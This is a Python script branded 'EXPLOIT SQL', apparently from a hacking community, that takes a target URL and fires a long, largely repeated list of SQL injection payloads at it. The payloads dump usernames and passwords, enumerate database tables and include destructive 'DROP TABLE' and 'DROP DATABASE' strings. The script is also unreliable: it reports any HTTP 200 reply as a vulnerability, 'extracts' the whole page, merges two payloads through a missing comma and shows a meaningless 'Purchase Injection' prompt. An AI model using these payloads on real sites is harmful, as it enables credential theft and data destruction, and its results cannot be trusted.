import requests
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

def save_to_file(filename, data):
    with open(filename, "a", encoding="utf-8") as file:
        file.write(data + "\n")

ascii_art = f'''
{Fore.YELLOW}███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗    ███████╗ ██████╗ ██╗
██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝    ██╔════╝██╔═══██╗██║
█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║       ███████╗██║   ██║██║
██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║       ╚════██║██║▄▄ ██║██║
███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║       ███████║╚██████╔╝███████╗
╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝       ╚══════╝ ╚══▀▀═╝ ╚══════╝

      |________|___________________|_
      |        | | | | | | | | | | | |________________
      |________|___________________|_|
      |        |                   |

{Style.RESET_ALL}
'''

print(ascii_art)

url = input(f"{Fore.CYAN}Enter the target URL to test for SQL Injection: {Style.RESET_ALL}")

payloads = [
    "' UNION SELECT NULL, username, password FROM users --",
    "' UNION SELECT NULL, group_concat(table_name), NULL FROM information_schema.tables --",
    "' UNION SELECT NULL, group_concat(column_name), NULL FROM information_schema.columns WHERE table_name='users' --"
     "' UNION SELECT database() --", "' UNION SELECT group_concat(table_name) FROM information_schema.tables --",
        "' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users' --",
        "' UNION SELECT group_concat(username, password) FROM users --", "' OR 1=1 --", "' OR 'a'='a --",
        "' AND 1=1 --", "' AND 'a'='a --", "'; DROP TABLE users --", "'; DROP DATABASE test --",
        "' UNION SELECT 1, 2, 3, 4 --", "' AND 1=2 --", "' OR 1=1 LIMIT 1 --", "' OR sleep(5) --", "' AND sleep(5) --",
        "' AND BENCHMARK(1000000, SHA1('a')) --", "' UNION SELECT null, null, null, null --", "' HAVING 1=1 --",
        "' GROUP BY NULL HAVING 1=1 --", "' UNION SELECT 1, 2, 3, 4, 5, 6 --", "' AND 1=1 --", "' OR 1=1 --",
        "' UNION SELECT group_concat(username, password) FROM users --", "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --",
        "' OR EXISTS(SELECT * FROM users) --", "' AND 1=1 UNION SELECT username, password FROM users --", "' OR SLEEP(5) --",
        "' OR BENCHMARK(1000000, SHA1('a')) --", "' UNION SELECT null, null, null --", "' HAVING 1=1 --", "'",
        "' OR '1'='1 --", "' AND 1=1 UNION SELECT username, password FROM admins --", "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='test' --",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='admins' --", "' UNION SELECT password FROM users --",
        "' UNION SELECT version() --", "' AND 1=1 LIMIT 1 --", "' UNION SELECT concat(username, ':', password) FROM users --",
        "' OR 1=1 --", "' AND 1=2 --", "' OR 1=1 --", "'; DROP TABLE admin --", "'; DROP DATABASE demo --", 
        "' UNION SELECT user(), database() --", "' OR 'a'='a --", "' AND 'x'='x --", "' OR '1'='1' --", "' UNION SELECT table_name FROM information_schema.tables --",
        "' UNION SELECT concat(table_name, ':', column_name) FROM information_schema.columns --", "' OR 1=1 UNION SELECT username, password FROM users --",
        "' OR 1=1 UNION SELECT table_name FROM information_schema.tables --", "' OR 1=1 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --",
        "' AND 1=1 UNION SELECT username, password FROM admins --", "' OR sleep(5) --", "' OR BENCHMARK(1000000, SHA1('a')) --", 
        "' UNION SELECT database() --", "' UNION SELECT user() --", "' UNION SELECT system_user() --", "' UNION SELECT host() --",
        "' AND 1=1 UNION SELECT username, password FROM users --", "' UNION SELECT password FROM users WHERE username='admin' --",
        "' AND 1=1 UNION SELECT 1, 2, 3 --", "' UNION SELECT null, null, null, null, null --", "' UNION SELECT concat(username, ':', password) FROM users --",
        "' AND 1=1 UNION SELECT database() --", "' OR 'a'='a' --", "' OR 1=1 LIMIT 1 --", "' UNION SELECT null, null --",
        "' OR BENCHMARK(1000000, SHA1('a')) --", "' OR 1=1 --", "' UNION SELECT group_concat(username, password) FROM users --",
        "' AND 1=1 UNION SELECT username, password FROM users WHERE username='admin' --", "' UNION SELECT table_name FROM information_schema.tables --",
        "' OR '1'='1 --", "' AND 1=1 UNION SELECT username, password FROM users --", "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='admins' --",
        "' OR 1=1 UNION SELECT username, password FROM admins --", "' OR '1'='1' --", "' UNION SELECT table_name FROM information_schema.tables --",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='admins' --", "' AND 1=1 UNION SELECT null, null --",
        "' OR 1=1 --", "' UNION SELECT concat(username, ':', password) FROM users --", "' OR BENCHMARK(1000000, SHA1('a')) --",
        "' AND 1=1 UNION SELECT username, password FROM admins --", "' OR EXISTS(SELECT * FROM users) --", "' AND BENCHMARK(1000000, SHA1('a')) --",
        "' UNION SELECT null, null --", "' OR sleep(5) --", "' UNION SELECT null, null, null, null --", "' AND 1=1 UNION SELECT null --",
        "' AND 1=1 UNION SELECT 1, 2, 3 --", "' OR '1'='1 --", "' OR 1=1 --", "' UNION SELECT concat(username, ':', password) FROM users --",
        "' AND 1=1 UNION SELECT null, null --", "' OR 1=1 --", "' UNION SELECT 1, 2, 3, 4, 5 --", "' OR 1=1 UNION SELECT table_name FROM information_schema.tables --",
        "' OR 1=1 UNION SELECT username, password FROM users --", "' UNION SELECT user(), database() --", "' OR BENCHMARK(1000000, SHA1('a')) --",
        "' OR 1=1 UNION SELECT group_concat(username, password) FROM users --", "' OR 1=1 UNION SELECT table_name FROM information_schema.tables --",
        "' AND 1=1 UNION SELECT null, null, null --", "' UNION SELECT username, password FROM users --", "' OR sleep(5) --", 
        "' UNION SELECT null, null --", "' OR 1=1 --", "' UNION SELECT table_name FROM information_schema.tables --"
]

def test_sql_injection(target_url, payloads):
    print(f"{Fore.CYAN}[INFO] Starting SQL injection test on: {target_url}{Style.RESET_ALL}")
    save_to_file("exploitSQL.txt", f"[INFO] Target: {target_url}\n")

    for payload in payloads:
        try:
            test_url = target_url + payload
            response = requests.get(test_url, timeout=5)

            if response.status_code == 200:
                print(f"{Fore.GREEN}[INFO] Potential vulnerability found with payload: {payload}{Style.RESET_ALL}")
                save_to_file("exploitSQL.txt", f"[VULN] {payload}")

                if "UNION SELECT" in payload:
                    extracted_data = extract_data_from_response(response.text)
                    if extracted_data:
                        print(f"{Fore.YELLOW}[DATA] Extracted data with payload: {payload}{Style.RESET_ALL}")
                        save_to_file("exploitSQL.txt", f"[DATA] {extracted_data}")

            else:
                print(f"{Fore.YELLOW}[WARNING] No vulnerability detected for: {payload}{Style.RESET_ALL}")

        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[ERROR] Request failed: {str(e)}{Style.RESET_ALL}")
            save_to_file("errors.log", f"[ERROR] {str(e)}")

def extract_data_from_response(response_text):
    return response_text

test_sql_injection(url, payloads)

purchase = input(f"{Fore.CYAN}Purchase Injection (y/n): {Style.RESET_ALL}")
if purchase.lower() == 'y':
    print(f"{Fore.RED}[WARNING] Be cautious about the sites you test for SQL injection.{Style.RESET_ALL}")
    try:
        with open("exploitSQL.txt", "r") as file:
            print(f"{Fore.YELLOW}Extracted Data:{Style.RESET_ALL}")
            print(file.read())
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] No data file found.{Style.RESET_ALL}")
else:
    print(f"{Fore.CYAN}Exiting without purchasing.{Style.RESET_ALL}")
input("[+] By Malveillance")
input("[+] discord.gg/ressourcesfr")
